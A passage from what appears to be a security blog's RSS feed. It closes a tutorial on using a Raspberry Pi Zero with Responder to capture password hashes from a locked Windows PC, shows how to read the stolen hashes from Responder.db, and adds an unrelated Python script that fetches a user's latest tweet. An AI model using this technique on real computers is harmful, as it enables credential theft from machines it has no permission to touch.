&lt;p&gt;Create a &lt;strong&gt;logs&lt;/strong&gt; folder:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo mkdir /root/logs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Add a .screenrc file&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo nano /root/.screenrc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the below code in .screenrc file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Logging
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That concludes the setup.&lt;/p&gt;

&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;Try plugging in the Pi Zero to a locked Windows PC and wait. If all goes well, the Responder.db file will be created at &lt;strong&gt;/home/pi/tools/responder/&lt;/strong&gt; and hashes will be stored.&lt;/p&gt;

&lt;p&gt;The captured hashes can be viewed using &lt;strong&gt;sqlite3&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sqlite3 /home/pi/tools/responder/Responder.db
select * from responder;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/sqlite3_out.png&#34; alt=&#34;sqlite3_out&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Also, check out &lt;a href=&#34;https://github.com/wismna/HackPi&#34;&gt;Hackpi&lt;/a&gt; from wismna which automates all of the above and works without driver installation on Windows, Linux and MacOS. :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Python code to retrieve the latest tweet from a user</title>
      <link>https://zone13.io/post/python-code-latest-tweet/</link>
      <pubDate>Sat, 17 Sep 2016 15:25:24 +0100</pubDate>
      
      <guid>https://zone13.io/post/python-code-latest-tweet/</guid>
      <description>&lt;p&gt;This is a Python code snippet to retrieve the latest tweet from a user by making use of the Twitter developer API.&lt;/p&gt;

&lt;p&gt;The Twitter API details can be obtained from the &lt;a href=&#34;https://apps.twitter.com/&#34;&gt;developer portal&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Github &lt;a href=&#34;https://github.com/zone13/python_dev/blob/master/twitter_latest_tweet.py&#34;&gt;link&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

#Python script to retrive the latest tweet from a user
#Created by zone13.io (https://www.zone13.io)
#Version 1.0
#Usage - ./script.py &amp;lt;twitter_handle&amp;gt;
#e.g. ./script.py rihanna
#Adapted from https://github.com/bear/python-twitter
#Requirement - pip install python-twitter

import sys,twitter
api = twitter.Api()

#Populate your twitter API details below
consumer_key = &#39;&#39;
consumer_secret = &#39;&#39;
access_token_key = &#39;&#39;
access_token_secret = &#39;&#39;

api = twitter.Api(
    consumer_key=consumer_key,
    consumer_secret=consumer_secret,
    access_token_key=access_token_key,
    access_token_secret=access_token_secret
)

def user_tweet(thandle):
	statuses = api.GetUserTimeline(screen_name=thandle)
	return statuses[0].text
	
if __name__ == &amp;quot;__main__&amp;quot;:
	latest_tweet = user_tweet(sys.argv[1])
	print latest_tweet
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>